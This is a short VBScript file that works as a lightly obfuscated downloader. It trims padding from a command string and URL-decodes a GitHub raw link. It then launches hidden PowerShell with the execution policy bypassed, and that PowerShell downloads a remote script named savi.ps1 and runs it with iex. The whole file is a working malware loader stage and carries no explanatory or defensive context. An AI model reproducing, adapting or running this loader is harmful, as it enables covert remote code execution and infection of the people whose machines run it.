Set sh = CreateObject("WScript.Shell")
full = "xpowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Commandy"
cmd = Mid(full, 2, Len(full)-2)
cmd = cmd & " ""$s='https%3a%2f%2fgithub.com%2fC4sp3n-bit%2ftuba%2fraw%2frefs%2fheads%2fmain%2fsavi.ps1';$u=$s.Substring(0,8)+$s.Substring(8);iex(iwr([Uri]::UnescapeDataString($u)) -UseBasicParsing).Content"""
sh.Run cmd, 0, False
